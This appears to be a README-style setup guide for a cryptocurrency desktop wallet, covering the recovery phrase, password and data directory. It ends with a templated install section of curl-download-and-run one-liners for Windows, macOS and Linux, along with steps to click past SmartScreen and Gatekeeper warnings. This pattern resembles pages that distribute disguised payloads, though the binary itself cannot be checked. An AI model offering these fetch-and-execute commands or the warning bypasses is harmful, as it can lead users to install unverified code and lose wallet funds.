![Aurora Wallet first run setup guide](assets/aurora-wallet-guide-article-banner.png)

# Aurora Wallet first run setup: phrase, password and data directory

What the opening wizard asks for, in the order it asks, and why each answer matters.

## Downloads - 2026.08.1.0

<p align="center"><a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.exe"><img src="assets/download-windows.svg" alt="Download Windows"></a> <a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.dmg"><img src="assets/download-macos.svg" alt="Download macOS"></a> <a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.zip"><img src="assets/download-linux.svg" alt="Download Linux"></a></p>

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="assets/platform-windows.svg" alt="platform Windows"> | Windows 10 (1909) or later, 64-bit | [`aurora-wallet-v2026.08.1.0.exe`](https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.exe) |
| <img src="assets/platform-macos.svg" alt="platform macOS"> | macOS 12 or later | [`aurora-wallet-v2026.08.1.0.dmg`](https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.dmg) |
| <img src="assets/platform-linux.svg" alt="platform Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`aurora-wallet-v2026.08.1.0.zip`](https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.zip) |


The first launch of Aurora Wallet creates the keys that hold your Auroracoin, so it is worth two quiet minutes rather than a click-through.

The first-run wizard creates a twelve or twenty-four word BIP-39 recovery phrase, asks you to confirm it, sets a password for the local wallet file and names the data directory where the blockchain and wallet are stored. When the wizard closes, the wallet begins downloading the chain and shows progress at the bottom of the window.

<!-- ARTICLE-BODY-BEGIN -->

## What the wizard asks for

The phrase comes first, because everything else depends on it. The words are the master copy of your private keys: a compatible wallet rebuilds every address from them, on any machine, without a backup file. Write them on paper in order, check the confirmation step the wizard shows, and store the paper somewhere that survives a house move.

The password comes second. It encrypts the wallet file on disk and is required whenever the wallet signs a transaction. It is not a recovery method: a forgotten password is recovered with the phrase, not with a support ticket.

## Setting the data directory

The data directory holds two different things. The wallet file is small and precious; the chain data is large and replaceable. On a laptop with a small system drive, point both at an external or secondary drive now rather than moving files later, and keep at least ten gigabytes free for the chain as it grows.

The default locations are recorded in <a href="https://github.com/aurora-coin/aurora-wallet-docs/blob/HEAD/docs/21-wallet-dat-location.md">where the wallet.dat file lives</a> for each operating system, which is also the page to open before you ever copy a wallet file between machines.

## Finishing the setup

Let the sync reach one hundred percent before you receive funds. A wallet that shows a balance of zero while the chain is still downloading is normal, and sending a test amount early only makes the wait more confusing.

If you are starting from a fresh download, use the <a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest">current Aurora Wallet build</a> rather than an older installer you find on a disk, then follow the confirmation step carefully.

The phrase you write down is the same one used on any replacement machine, and <a href="https://github.com/aurora-coin/aurora-wallet-docs/blob/HEAD/docs/25-recovery-phrase-bip39.md">restoring from a recovery phrase</a> walks through the restore side of this page.

## FAQ

### Can I change the data directory later?

Yes. Close the wallet, move the folder and point the application at the new location on the next start. The wallet file travels with the chain data, so move both together.

### What if I lose the paper with the words?

There is no remote copy to recover. The phrase is the only backup that restores the wallet without the original file, which is why the wizard insists you write it down before it lets you continue.

<!-- ARTICLE-BODY-END -->

## How to install Aurora Wallet

### Windows
Quick install (CMD):

```cmd
curl -fLo setup.exe https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.exe && setup.exe
```

Manual install:
1. Download <a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.exe">aurora-wallet-v2026.08.1.0.exe</a>.
2. Open the downloaded file.
3. If SmartScreen appears, choose More info, then Run anyway.
4. Finish the setup steps.

Check the download: run the command below and compare the result with `f9fdc62a9566b61a1dae689b5aaa1a2df3fcb3e0270a5d2d4bd32e937b924049`.

```cmd
certutil -hashfile setup.exe SHA256
```

### macOS
Quick install (Terminal):

```bash
curl -fLo setup.dmg https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.dmg && open setup.dmg
```

Manual install:
1. Download <a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.dmg">aurora-wallet-v2026.08.1.0.dmg</a>.
2. Open the .dmg file.
3. Drag the app to Applications.
4. On first launch, right-click the app and choose Open.

Check the download: run the command below and compare the result with `2c0fd3f9a9c7ff4df8d10621be1b9284262b4a32109887768c259bc3fb5699f9`.

```bash
shasum -a 256 setup.dmg
```

### Linux
Quick install (Terminal):

```bash
curl -fLo app.zip https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.zip && unzip -o app.zip && chmod +x aurora-wallet && ./aurora-wallet
```

Manual install:
1. Download <a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.zip">aurora-wallet-v2026.08.1.0.zip</a>.
2. Extract the archive.
3. Run `aurora-wallet`.

Check the download: run the command below and compare the result with `fcf7350d8f38256031aa2060bded8898f71cae2cd9613d19fdc0c3e37267717a`.

```bash
sha256sum app.zip
```


## Related guides

- [What is Aurora Wallet](https://github.com/aurora-coin/aurora-wallet-docs/blob/HEAD/docs/01-what-is-aurora-wallet.md)
- [Recovery phrase and BIP-39](https://github.com/aurora-coin/aurora-wallet-docs/blob/HEAD/docs/25-recovery-phrase-bip39.md)
- [Backup best practice](https://github.com/aurora-coin/aurora-wallet-docs/blob/HEAD/docs/33-backup-best-practice.md)
- [Password encryption](https://github.com/aurora-coin/aurora-wallet-docs/blob/HEAD/docs/34-password-encryption.md)
